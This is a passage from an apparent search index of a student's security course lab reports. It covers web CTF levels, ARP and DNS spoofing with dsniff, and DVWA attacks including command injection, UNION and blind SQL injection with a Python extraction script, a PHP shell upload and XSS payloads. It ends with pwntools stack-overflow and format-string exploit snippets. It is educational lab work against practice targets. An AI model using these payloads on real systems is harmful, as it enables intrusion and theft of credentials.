more.</p>"},{"location":"sec/netsec/lab1/#tasks","title":"Tasks","text":""},{"location":"sec/netsec/lab1/#task-1-http1015111100game1","title":"Task 1: http://10.15.111.100/game1","text":""},{"location":"sec/netsec/lab1/#level-1","title":"Level 1.","text":"<p>Press <code>F12</code> to toggle the developer tools of Chrome, we can find the comment with password and the real check process in the source code:</p> <p>Input <code>029c64152b6954e91d39183f8d2e07a9</code> then we can enter the next level.</p>"},{"location":"sec/netsec/lab1/#level-2","title":"Level 2.","text":"<p>This page just add a script to detect openning of context menu. So <code>F12</code> still works:</p> <p>Input <code>b910592a8ff0f56123105740c1735eb0</code> to enter the next level.</p>"},{"location":"sec/netsec/lab1/#level-3","title":"Level 3.","text":"<p>We can't find flag in the source code of this level. Then try to curl it with verbose mode:</p> <p>We can find the flag in the response header.</p>"},{"location":"sec/netsec/lab1/#task-2-http1015111100game2","title":"Task 2: http://10.15.111.100/game2","text":""},{"location":"sec/netsec/lab1/#level-1_1","title":"Level 1.","text":"<p>With the comment in the page source, we can notice that there has a 302 redirection. Then we curl it with verbose mode:</p>"},{"location":"sec/netsec/lab1/#level-2_1","title":"Level 2.","text":"<p>Note that we need to make us looks like referer from <code>http://localhost/</code>. We can set the referer field in the request header. A method to do this is to use curl with <code>--referer</code> option:</p> <p>And then we can find the password in the html code of response:</p>"},{"location":"sec/netsec/lab1/#level-3_1","title":"Level 3.","text":"<p>In the comment of the page source, it tells us that this level works with a cookie. In the \"Application\" part of develop tools, we can find that there is a cookie <code>admin: 0</code>. So we can change it to 1 in the develop tools and refresh the page:</p> <p>Also, we can use curl to set cookie:</p> <pre><code>\u276f curl -v http://10.15.111.100/game2/f451899344a962d6d27a73e2902f8e51.php --cookie \"admin=1\"\n*   Trying 10.15.111.100:80...\n* Connected to 10.15.111.100 (10.15.111.100) port 80 (#0)\n&gt; GET /game2/f451899344a962d6d27a73e2902f8e51.php HTTP/1.1\n&gt; Host: 10.15.111.100\n&gt; User-Agent: curl/7.71.1\n&gt; Accept: */*\n&gt; Cookie: admin=1\n&gt;\n\n...\n\nFlag \u53ea\u6709\u6765\u81ea admin \u624d\u770b\u5f97\u5230\u3002\nOk, give you flag: ACTF{47ca8aa874ba92a43621d5ff8cde0cdf}&lt;!--Do you know how http cookie worked? --&gt;\n...\n</code></pre>"},{"location":"sec/netsec/lab1/#task-3-http102141601310000","title":"Task 3: http://10.214.160.13:10000/","text":""},{"location":"sec/netsec/lab1/#level-1_2","title":"Level 1.","text":"<p>The comment hint that there is a <code>1.php.bak</code> still exists. So we can access and download it. Then we can find the entry of the next level:</p> <pre><code>&lt;a href=\"the2nd.php\"&gt;\u8fdb\u5165\u7b2c\u4e8c\u5173&lt;/a&gt;\n</code></pre>"},{"location":"sec/netsec/lab1/#level-2-3","title":"Level 2 &amp; 3.","text":"<p>In the second level, there is a button, whatever you submit, it always redirect to <code>3rd.php</code> which ask you \"where are you from\" and then redirect back to <code>the2nd.php</code>:</p> <pre><code>\u276f curl -X POST -d \"text=\" http://10.214.160.13:10000/the2nd.php\n...\n    jumping...\n    &lt;script&gt;\n        function jump(url){\n            document.body.appendChild(document.createElement('iframe')).src='javascript:\"&lt;script&gt;top.location.replace(\\''+url+'\\')&lt;\\/script&gt;\"';\n        }\n        setInterval(\"jump('3rd.php')\",2000);\n...\n\u276f curl http://10.214.160.13:10000/3rd.php\n&lt;script&gt;alert('\u4f60\u4ece\u54ea\u91cc\u6765\uff1f');window.location='the2nd.php';&lt;/script&gt;\n</code></pre> <p>With the same idea of task 2 level 2, we can set the referer field to <code>http://10.214.160.13:10000/the2nd.php</code> to \"answer\" the \"question\":</p> <pre><code>\u276f curl --referer http://10.214.160.13:10000/the2nd.php -v http://10.214.160.13:10000/3rd.php\n*   Trying 10.214.160.13:10000...\n* Connected to 10.214.160.13 (10.214.160.13) port 10000 (#0)\n&gt; GET /3rd.php HTTP/1.1\n&gt; Host: 10.214.160.13:10000\n&gt; User-Agent: curl/7.71.1\n&gt; Accept: */*\n&gt; Referer: http://10.214.160.13:10000/the2nd.php\n&gt;\n...\n&lt;button type=\"button\" onclick=\"javascript:location.href='di4guan.php'\"&gt;\u4f60\u53c8\u8981\u5230\u54ea\u91cc\u53bb&lt;/button&gt;\n...\n</code></pre>"},{"location":"sec/netsec/lab1/#level-4","title":"Level 4.","text":"<p>No any information in the page source. Then try to curl and get the response header:</p> <p>We can find <code>Next: wozaizheli.php</code></p>"},{"location":"sec/netsec/lab1/#level-5","title":"Level 5.","text":"<p>Through the page source, we can find the form details:</p> <pre><code>&lt;script&gt;\nfunction joy(){\n    document.getElementById(\"joy\").style.display=\"none\";\n}\n&lt;/script&gt;\n\u70b9\u51fb\u6309\u94ae\u5c31\u80fd\u62ff\u5230flag\u5566~&lt;br&gt;\n&lt;div id=\"joy\" onmouseover=\"joy()\"&gt;\n&lt;form method=\"post\"&gt;\n&lt;input type=\"hidden\" value=\"HIT\" name=\"HIT\"/&gt;\n&lt;input type=\"submit\" value=\"\u70b9\u6211\" style=\"display:block\" id=\"submit\" name=\"submit\"/&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n</code></pre> <p>So normally we can't press the button because it will disappear when we move the mouse to it. We can use curl to submit the form:</p> <pre><code>\u276f curl -X POST -d \"HIT=HIT\" http://10.214.160.13:10000/wozaizheli.php\n&lt;html&gt;\n&lt;head&gt;\n  &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n  &lt;meta http-equiv=\"Content-Language\" content=\"zh-CN\" /&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div align=\"center\"&gt;\n&lt;script&gt;\nfunction joy(){\n    document.getElementById(\"joy\").style.display=\"none\";\n}\n&lt;/script&gt;\n\u70b9\u51fb\u6309\u94ae\u5c31\u80fd\u62ff\u5230flag\u5566~&lt;br&gt;\n&lt;div id=\"joy\" onmouseover=\"joy()\"&gt;\n&lt;form method=\"post\"&gt;\n&lt;input type=\"hidden\" value=\"HIT\" name=\"HIT\"/&gt;\n&lt;input type=\"submit\" value=\"\u70b9\u6211\" style=\"display:block\" id=\"submit\" name=\"submit\"/&gt;\n&lt;/div&gt;\nflag:  AAA{y0u_2a_g0od_front-end_Web_developer}&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Then we find the flag: <code>AAA{y0u_2a_g0od_front-end_Web_developer}</code>.</p>"},{"location":"sec/netsec/lab2/","title":"Network Security Lab 2","text":"<p> \u7ea6 407 \u4e2a\u5b57  47 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u7f51\u7edc\u5b89\u5168 lab2 \u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014\uff0c\u4e00\u5207\u540e\u679c\u4e0e\u672c\u4eba\u65e0\u5173</p>"},{"location":"sec/netsec/lab2/#goal","title":"Goal","text":"<p>Lab 02 aims to understand the principle of ARP deception and DNS deception, and practice these attacks through tools such as WinCap and Cain.</p> <p>*but due to the instruction of TAs, we actually use dsniff tools to perform ARP and DNS deception.</p>"},{"location":"sec/netsec/lab2/#steps","title":"Steps","text":""},{"location":"sec/netsec/lab2/#setup-vm-and-ip","title":"Setup vm and IP","text":"<p>I use macOS as host machine, and use Parallels Desktop as the virtual machine application. And I have installed Ubuntu 22.04 server in the virtual machine.</p> <p>Parallels Desktop recommends to use \"shared network\" mode, but in this mode I found that the host can't ping the gateway of the bridge interface, and the attack also won't effect the host's network. So I turn to \"bridged network\" mode to use the same WiFi network as the host.</p> <p>After turn down the IPv6 on macOS, the vm can access the network using IPv4. Then we can find the IP address of the host and vm through <code>ifconfig</code> command</p> <p>And in the host:</p> <pre><code>\u276f ifconfig\n...\nen0: flags=8b63&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu 1500\n    options=400&lt;CHANNEL_IO&gt;\n    ether 88:66:5a:0c:09:90\n    inet 172.20.10.2 netmask 0xfffffff0 broadcast 172.20.10.15\n    inet6 fe80::8c0:a128:18ee:a8c6%en0 prefixlen 64 secured scopeid 0x7\n    nd6 options=201&lt;PERFORMNUD,DAD&gt;\n    media: autoselect\n    status: active\n...\n</code></pre> <p>And we can find the gateway and dns server using <code>netstat -rn</code> and <code>scutil --dns</code> command in the host:</p> <pre><code>\u276f netstat -rn\nRouting tables\n\nInternet:\nDestination        Gateway            Flags               Netif Expire\ndefault            172.20.10.1        UGScg                 en0\n...\n\n\u276f scutil --dns\nDNS configuration\n\nresolver #1\n  nameserver[0] : 172.20.10.1\n  if_index : 7 (en0)\n  flags    : Request A records\n  reach    : 0x00020002 (Reachable,Directly Reachable Address)\n\n...\n\nDNS configuration (for scoped queries)\n\nresolver #1\n  nameserver[0] : 172.20.10.1\n  if_index : 7 (en0)\n  flags    : Scoped, Request A records\n  reach    : 0x00020002 (Reachable,Directly Reachable Address)\n</code></pre> <p>So we can know that the host's ip at this interface is <code>172.20.10.2</code>, the gateway and DNS server is <code>172.20.10.1</code>, the vm's ip is <code>172.20.10.6</code> and the host and vm can ping each other:</p>"},{"location":"sec/netsec/lab2/#arp-spoofing","title":"ARP Spoofing","text":"<p>First check the ARP table of the host:</p> <pre><code>\u276f arp -a\n...\n? (172.20.10.1) at 62:57:c8:17:26:64 on en0 ifscope [ethernet]\n? (172.20.10.2) at 88:66:5a:c:9:90 on en0 ifscope permanent [ethernet]\n? (172.20.10.6) at 0:1c:42:ae:51:ae on en0 ifscope [ethernet]\n</code></pre> <p>Mainly focus on the interface en0, with ip 172.20.10.(1|2|6).</p> <p>Then run <code>arpspoof</code> command in the vm to perform ARP spoofing to the host's gateway:</p> <p>We can see that the vm is replying host with wrong MAC address which point to itself. So then 172.20.10.1's MAC address will point to the vm:</p> <p>We can see that the MAC address of 172.20.10.1 is successfully modified to <code>0:1c:42:ae:51:ae</code> which is the same as 172.20.10.6.</p>"},{"location":"sec/netsec/lab2/#dns-spoofing","title":"DNS Spoofing","text":"<p>With the <code>arpspoof</code> running, we can run <code>dnsspoof</code> at the same time to reply wrong DNS result. Write <code>10.10.10.3 *.baidu.com</code> to <code>dnsspoof.hosts</code> and then run <code>dnsspoof</code>:</p> <pre><code>\u276f sudo dnsspoof -i enp0s5 -f dnsspoof.hosts host 172.20.10.2 and udp port 53\ndnsspoof: listening on enp0s5 [host 172.20.10.2 and udp port 53]\n</code></pre> <p>Then <code>ping www.baidu.com</code> in the host, we can find that the ip address of www.baidu.com is resolved to 10.10.10.3:</p> <p>And we can find a DNS log of <code>dnsspoof</code>:</p> <pre><code>\u276f sudo dnsspoof -i enp0s5 -f dnsspoof.hosts host 172.20.10.2 and udp port 53\ndnsspoof: listening on enp0s5 [host 172.20.10.2 and udp port 53]\n172.20.10.2.62144 &gt; 172.20.10.1.53:  17469+ A? www.baidu.com\n</code></pre> <p>So the ARP spoofing attack and DNS spoofing attack is succeed.</p>"},{"location":"sec/netsec/lab3/","title":"Network Security Lab 3","text":"<p> \u7ea6 618 \u4e2a\u5b57  52 \u884c\u4ee3\u7801  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u7f51\u7edc\u5b89\u5168 lab3 \u5b9e\u9a8c\u62a5\u544a</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014\uff0c\u4e00\u5207\u540e\u679c\u4e0e\u672c\u4eba\u65e0\u5173</p>"},{"location":"sec/netsec/lab3/#goal","title":"Goal","text":"<p>Lab 03 aims to practice common web vulnerabilities and protection schemes.</p>"},{"location":"sec/netsec/lab3/#challenges","title":"Challenges","text":"<p>I use docker to deploy DVWA which is more convenient and secure instead of PHPStudy.</p>"},{"location":"sec/netsec/lab3/#command-injection","title":"Command Injection","text":"<p>From the source code, we can find:</p> <pre><code>$cmd = shell_exec( 'ping  -c 4 ' . $target );\n</code></pre> <p>which just concatenate the input directly to the command, so we can use <code>&amp;</code> to chain another command. Input <code>localhost &amp; whoami &amp; hostname</code> and we can see the output which is the username and hostname:</p>"},{"location":"sec/netsec/lab3/#csrf","title":"CSRF","text":"<p>When changing password, we can see the link is changed to <code>http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code>, and the source code doesn't have any protection. So no matter where the user is, if the user access the link, the password will be changed, even if the operation is not from this website.</p>"},{"location":"sec/netsec/lab3/#file-inclusion","title":"File Inclusion","text":"<p>From the source code, we can know that the page is just accessed from <code>page</code> parameter in the URL. So if we want to access <code>../hackable/flags/fi.php</code> in the instruction, we can use <code>?page=../../hackable/flags/fi.php</code> to access it.</p> <p>But this will make the page rendered as php source code, so some information is hidden. So we should try to get the source code. We can use <code>php://filter</code> to return the base64 encode of the file by <code>?page=php://filter/read=convert.base64-encode/resource=../../hackable/flags/fi.php</code>, and we get:</p>"},{"location":"sec/netsec/lab3/#file-upload","title":"File Upload","text":"<p>From the source code, we can know that the server just receive all files and move it to <code>hackable/uploads</code> and then tell you the actual path. So we can upload a php file with RCE and then access the page. We can upload <code>upload.php</code>:</p> <pre><code>&lt;?php echo shell_exec('whoami') ?&gt;\n</code></pre> <p>Then we access <code>http://127.0.0.1:4280/hackable/uploads/upload.php</code>, then we can find the result:</p>"},{"location":"sec/netsec/lab3/#sql-injection","title":"SQL Injection","text":"<p>From the source code we know that the query command is:</p> <pre><code>$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";\n</code></pre> <p>So it just put the input in it. We can first close the quote and then use <code>union</code> to select the password. Now if we input <code>1' UNION SELECT first_name, password as last_name FROM users WHERE '1'='1</code> the command is:</p> <pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password as last_name FROM users WHERE '1'='1';\n</code></pre> <p>Then we can get the password:</p>"},{"location":"sec/netsec/lab3/#sql-injection-blind","title":"SQL Injection (Blind)","text":"<p>From the source code, we can know that we can only get whether the user exists in the database (whether the query is success), and no other information. So we can use the query result to leak each char of the password. We can use the following SQL command to test each char:</p> <pre><code>SELECT first_name, last_name FROM users WHERE user_id = '\ncrane' OR ascii(substr((SELECT password FROM users LIMIT 0, 1), 1, 1)) = 48\n#';\n</code></pre> <p>So we should use <code>+</code> to replace the space and use <code>%23</code> to represent <code>#</code>. Then we can use the following python code to get the password:</p> <pre><code>import requests\n\nurl = 'http://127.0.0.1:4280/'\n\nsess = requests.Session()\n\n# login\nuser_token = sess.get(url + 'login.php').text.split('name=\\'user_token\\' value=\\'')[1].split('\\'')[0]\nsess.post(url + 'login.php', data={'username': 'admin', 'password': '123', 'Login': 'Login', 'user_token': user_token})\nsess.post(url + 'security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': user_token})\n\ntarget = url + 'vulnerabilities/sqli_blind/?id='\nsql = 'crane\\' OR ascii(substr((SELECT password FROM users LIMIT {i}, 1), {j}, 1)) = {k}%23&amp;Submit=Submit#'.replace(' ', '+')\n\nfor i in range(0, 5):\n    password = ''\n    for j in range(1, 33):\n        for k in '0123456789abcdef':\n            url = target + sql.format(i=i, j=j, k=ord(k))\n            res = sess.get(url)\n            if res.status_code == 200:\n                password += k\n                break\n    print(f\"[+] Password {i}: {password}\")\n</code></pre> <p>Then we get the result:</p> <pre><code>\u276f python exp.py\n[+] Password 0: 202cb962ac59075b964b07152d234b70\n[+] Password 1: e99a18c428cb38d5f260853678922e03\n[+] Password 2: 8d3533d75ae2c3966d7e0d4fcc69216b\n[+] Password 3: 0d107d09f5bbe40cade3de5c71e9e9b7\n[+] Password 4: 5f4dcc3b5aa765d61d8327deb882cf99\n</code></pre>"},{"location":"sec/netsec/lab3/#weak-session-ids","title":"Weak Session IDs","text":"<p>From the source code, we can find that if the session ID is 0 at first, and for each new seccion, it will increase by 1. So we can predict the session ID by accessing the page multiple times.</p>"},{"location":"sec/netsec/lab3/#xss-dom","title":"XSS (DOM)","text":"<p>We can find the JavaScript source code in the Developer Tools:</p> <pre><code>if (document.location.href.indexOf(\"default=\") &gt;= 0) {\n  var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8);\n  document.write(\"&lt;option value='\" + lang + \"'&gt;\" + decodeURI(lang) + \"&lt;/option&gt;\");\n  document.write(\"&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;\");\n}\n\ndocument.write(\"&lt;option value='English'&gt;English&lt;/option&gt;\");\ndocument.write(\"&lt;option value='French'&gt;French&lt;/option&gt;\");\ndocument.write(\"&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;\");\ndocument.write(\"&lt;option value='German'&gt;German&lt;/option&gt;\");\n</code></pre> <p>So it will put the decoded value of the <code>default</code> parameter of the URI in the page. So if we access <code>?default=English&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>. Then the page's source will become:</p> <pre><code>&lt;option value='English%3Cscript%3Ealert(document.cookie)%3C/script%3E'&gt;\n  English\n  &lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;/option&gt;\n</code></pre> <p>So the script will be executed and show the alert:</p>"},{"location":"sec/netsec/lab3/#xss-reflected","title":"XSS (Reflected)","text":"<pre><code>echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';\n</code></pre> <p>So the page just put the input into the html source code. So if we input <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>, the result of echo will be <code>&lt;pre&gt;Hello &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/pre&gt;</code>, and the script will be executed.</p>"},{"location":"sec/netsec/lab3/#xss-stored","title":"XSS (Stored)","text":"<p>From the source, we can know that the php just read content from the database and then insert it into the page source. So if the data in the database contains script, it will also be executed.</p>"},{"location":"sec/softsec/","title":"\u8f6f\u4ef6\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u8f6f\u4ef6\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5\u201d \u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a\u5f52\u6863\uff08\u7406\u8bba\u77e5\u8bc6\u5c31\u662f pwn\uff0c\u6240\u4ee5\u4ee5\u540e\u6709\u673a\u4f1a\u4f1a\u6574\u7406\u5230 CTF \u90e8\u5206\uff0c\u8fd9\u91cc\u53ea\u7559\u5b9e\u9a8c\u62a5\u544a\uff09</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u8f6f\u4ef6\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5</li> </ul>"},{"location":"sec/softsec/#table-of-contents","title":"Table of Contents","text":"<ul> <li>lab1: \u5178\u578b\u7684\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\u53ca\u5176\u5229\u7528</li> <li>lab2: \u57fa\u7840\u5806\u77e5\u8bc6\u3001\u6f0f\u6d1e\u4e0e\u5229\u7528</li> <li>lab3: \u52a8/\u9759\u6001\u5206\u6790</li> <li>lab4: \u8f6f\u4ef6\u5b89\u5168\u673a\u5236</li> <li>final lab: \u671f\u672b\u6d4b\u9a8c</li> </ul>"},{"location":"sec/softsec/final/","title":"Fanal Lab: \u671f\u672b\u6d4b\u9a8c","text":"<p> \u7ea6 1807 \u4e2a\u5b57  241 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u8f6f\u4ef6\u5b89\u5168 final lab \u5b9e\u9a8c\u62a5\u544a\uff082023.06.12 ~ 2023.07.03\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/softsec/final/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>01 - overflow<ul> <li>\u6210\u529f\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0810\u5206\uff09</li> <li>\u6210\u529f\u8df3\u8f6c\u5230\u540e\u95e8\uff0810\u5206\uff09</li> <li>\u6210\u529f\u5b8c\u6210\u672c\u5730\u7684\u5f39 shell\uff0810\u5206\uff09</li> <li>\u6210\u529f\u5b8c\u6210\u8fdc\u7a0b\u5f39 shell\uff0c\u6267\u884c flag.exe \u7a0b\u5e8f\uff0820\u5206\uff09</li> </ul> </li> <li>02 - rop + fsb<ul> <li>\u901a\u8fc7 fsb \u6cc4\u9732 libc \u7684\u57fa\u5730\u5740\uff0c\u62ff\u5230 system \u51fd\u6570\u5730\u5740\uff0810\u5206\uff09</li> <li>\u901a\u8fc7 fsb \u5c1d\u8bd5\u6539\u5199 printf \u7684 GOT\uff0c\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u66f4\u6539\u7684\u6210\u529f\u4e0e\u5931\u8d25\uff0810\u5206\uff09</li> <li>\u901a\u8fc7 fsb \u6cc4\u9732\u6808\u5730\u5740\uff0810\u5206\uff09</li> <li>\u901a\u8fc7 fsb \u5199 ROP payload\uff0c\u5b9e\u73b0\u672c\u5730\u5f39 shell\uff0810\u5206\uff09</li> <li>\u6210\u529f\u5b8c\u6210\u8fdc\u7a0b\u5f39 shell\uff0c\u6309\u9884\u671f\u6267\u884c flag.exe \u7a0b\u5e8f\uff0810\u5206\uff09</li> </ul> </li> <li>03 - bonus<ul> <li>\u901a\u8fc7\u9006\u5411\u53d1\u73b0\u9898\u76ee\u6f0f\u6d1e\uff0c\u5e76\u901a\u8fc7\u811a\u672c\u6210\u529f\u8ba9\u7a0b\u5e8f crash\uff0810\u5206\uff09</li> <li>\u6210\u529f\u5229\u7528\u5806\u6f0f\u6d1e\u5b9e\u73b0\u672c\u5730\u5f39 shell\uff0810\u5206\uff09</li> <li>\u6210\u529f\u5b8c\u6210\u8fdc\u7a0b\u5f39 shell\uff0c\u6309\u9884\u671f\u6267\u884c flag.exe \u7a0b\u5e8f\uff0810\u5206\uff09</li> </ul> </li> </ul>"},{"location":"sec/softsec/final/#overflow","title":"overflow","text":"<p>checksec \u6ca1\u5f00\u542f PIE \u548c canary\u3002\u7a0b\u5e8f\u4e2d gets(buf) \u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u76f4\u63a5\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u5373\u53ef\u3002\u901a\u8fc7 objdump \u5f97\u77e5 buf \u8d77\u59cb\u5730\u5740\u5728 rbp-0x40\uff1a</p> <pre><code>000000000040084f &lt;main&gt;:\n  ...\n  400853:       48 83 ec 50             sub    rsp,0x50\n  ...\n  4008b7:       48 8d 45 c0             lea    rax,[rbp-0x40]\n  4008bb:       48 89 c7                mov    rdi,rax\n  4008be:       b8 00 00 00 00          mov    eax,0x0\n  4008c3:       e8 c8 fd ff ff          call   400690 &lt;gets@plt&gt;\n  ...\n</code></pre> <p>\u6240\u4ee5\u8986\u76d6\u65f6\u5728\u8fd4\u56de\u5730\u5740\u524d\u52a0 0x40+8 \u4e2a\u5b57\u7b26 padding \u5373\u53ef\u3002</p> <p>\u63a5\u4e0b\u6765\u8003\u8651\u8fd4\u56de\u7684\u4f4d\u7f6e\uff0c\u76f4\u63a5\u8df3\u5230\u540e\u95e8\u7684\u8bdd\u9700\u8981\u77e5\u9053 key\uff0c\u4f46\u8fd9\u91cc\u6ca1\u5fc5\u8981\uff0c\u76f4\u63a5\u8df3\u5230 backdoor \u4e2d\u6267\u884c system \u7684\u4f4d\u7f6e\u5373\u53ef\uff0cobjdump \u53ef\u4ee5\u5f97\u77e5\u5e94\u8be5\u8df3\u8f6c\u5230 0x4007d1\uff1a</p> <pre><code>00000000004007a2 &lt;backdoor&gt;:\n  4007a2:       55                      push   rbp\n  ...\n  4007cc:       e8 5f fe ff ff          call   400630 &lt;puts@plt&gt;\n  4007d1:       bf 85 09 40 00          mov    edi,0x400985\n  4007d6:       e8 65 fe ff ff          call   400640 &lt;system@plt&gt;\n  ...\n</code></pre> <p>\u6240\u4ee5\u4e3b\u8981\u7684 exp \u53ea\u6709\u4e00\u53e5\uff1a</p> <pre><code>p.sendlineafter(b\"data:\", b\"A\" * (64 + 8) + p64(0x4007d1))\n</code></pre> <p></p>"},{"location":"sec/softsec/final/#rop-fsb","title":"rop + fsb","text":"<p>checksec\uff0c\u4fdd\u62a4\u5168\u5f00\u3002\u7a0b\u5e8f\u4e2d\u5b58\u5728 fsb \u6f0f\u6d1e\uff0c\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5c06\u8f93\u5165\u62fc\u63a5\u5728 \"[+]: \" \u540e\u9762\u7136\u540e\u76f4\u63a5 printf\uff0c\u5f53\u8f93\u5165\u7684\u5f00\u5934\u56db\u4e2a\u5b57\u8282\u8f6c\u4e3a int \u4e3a 0xdeadbeef \u65f6\u9000\u51fa\u3002</p>"},{"location":"sec/softsec/final/#got","title":"\u52ab\u6301 GOT","text":"<p>\u5148\u8003\u8651\u52ab\u6301 GOT \u8868\uff0cRELRO \u4fdd\u62a4\u662f Full \u7684\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\u4e0d\u80fd\u6539\u5199 GOT \u8868\uff0c\u8fd9\u91cc\u4ec5\u6309\u5b9e\u9a8c\u6307\u5bfc\u8fdb\u884c\u5c1d\u8bd5\u3002\u56e0\u4e3a\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE\uff0c\u6240\u4ee5 GOT \u8868\u5730\u5740\u4e5f\u662f\u968f\u673a\u7684\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u6839\u636e\u6808\u4e0a\u7684\u504f\u79fb\u6765\u8ba1\u7b97\uff0c\u6240\u4ee5\u53ea\u8981\u6cc4\u6f0f\u6808\u5730\u5740\u5373\u53ef\u3002</p> <p>\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u6808\u5e03\u5c40\u7c7b\u4f3c\u5982\u4e0b\uff1a <pre><code>00:0000\u2502 rsp 0x7ffd2500bce0 \u25c2\u2014 fmtstr\n01:0008\u2502     ...\n02:0010\u2502\n...    \u2502\n11:0088\u2502     0x7ffd2500bd68 \u25c2\u2014 0xb7ead3bc9042ca00\n12:0090\u2502     0x7ffd2500bd70 \u2014\u25b8 0x7ffd2500bd90 \u25c2\u2014 0x1\n13:0098\u2502     0x7ffd2500bd78 \u2014\u25b8 0x55e92680094b (main+35) \u25c2\u2014 mov    eax, 0\n</code></pre></p> <p>\u53ef\u4ee5\u901a\u8fc7 fsb \u4efb\u610f\u8bfb\u8bfb\u53d6\u6808\u4e0a\u90a3\u4e2a main+35 \u5730\u5740\u3002\u901a\u8fc7\u5c1d\u8bd5\u5f97\u77e5\u4f7f\u7528 %25$p \u5373\u53ef\u6cc4\u6f0f\u6b64\u5904\u5185\u5bb9\uff0c\u5373 main+35\u3002\u7136\u540e\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 printf GOT \u8868\u7684\u5b9e\u9645\u5730\u5740 main+35 - 0x94b\uff08main+35 \u5728\u4ee3\u7801\u6bb5\u4e2d\u504f\u79fb\uff09+ 0x6f0\uff08printf \u7684 PLT rip\uff09+ 6\uff08jmp \u6307\u4ee4\u957f\u5ea6\uff09+ 0x2008c2\uff08GOT \u504f\u79fb\uff09\u3002</p> <pre><code>payload = b\"%25$p\"\np.sendline(payload)\np.recvuntil(b\"[+]: \")\nmain_35 = int(p.recvline().strip(), 16)\nsuccess(f\"main+35: {hex(main_35)}\")\nprintf_got = main_35 - 0x94b + 0x6f0 + 6 + 0x2008c2\nsuccess(f\"printf_got: {hex(printf_got)}\")\n</code></pre> <p>\u7136\u540e\u518d\u4f7f\u7528\u4efb\u610f\u8bfb\u8bfb\u53d6 printf GOT \u8868\u5185\u5bb9\uff0c\u5f97\u5230 printf \u5730\u5740\uff0c\u4ece\u800c\u8ba1\u7b97 libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u5730\u5740\uff1a</p> <pre><code>payload = b\"%8$sAAAAAAA\" + p64(printf_got) + b\"\\x00\"\np.sendline(payload)\np.recvuntil(b\"[+]: \")\nprintf_addr = u64(p.recvn(6) + b\"\\x00\\x00\")\nlibc_base = printf_addr - libc.sym[\"printf\"]\nsystem_addr = libc_base + libc.sym[\"system\"]\nsuccess(f\"printf_addr: {hex(printf_addr)}\")\nsuccess(f\"libc_base: {hex(libc_base)}\")\nsuccess(f\"system_addr: {hex(system_addr)}\")\n</code></pre> <p>\u63a5\u4e0b\u6765\u5411 printf \u7684 GOT \u8868\u5199\u5165 system \u5730\u5740\uff0c\u8fd9\u91cc\u4f7f\u7528 fmtstr_payload \u6784\u9020\uff0c\u9700\u8981\u5c06\u5b9e\u9645 payload \u524d\u5185\u5bb9\u8865\u9f50\u5230 8 \u5b57\u8282\uff0c\u7136\u540e\u4f20\u53c2 numbwritten=8\uff08\u4e0d\u7136\u504f\u79fb\u4f1a\u6709\u9519+\u5730\u5740\u65e0\u6cd5\u5bf9\u9f50\uff09\uff1a</p> <pre><code>payload = fmtstr_payload(offset, {printf_got: system_addr}, numbwritten=8, write_size=\"short\")\npayload = b\"AAA\" + payload\ninfo(f\"payload: {payload}, len = {len(payload)}\")\np.sendline(payload)\n</code></pre> 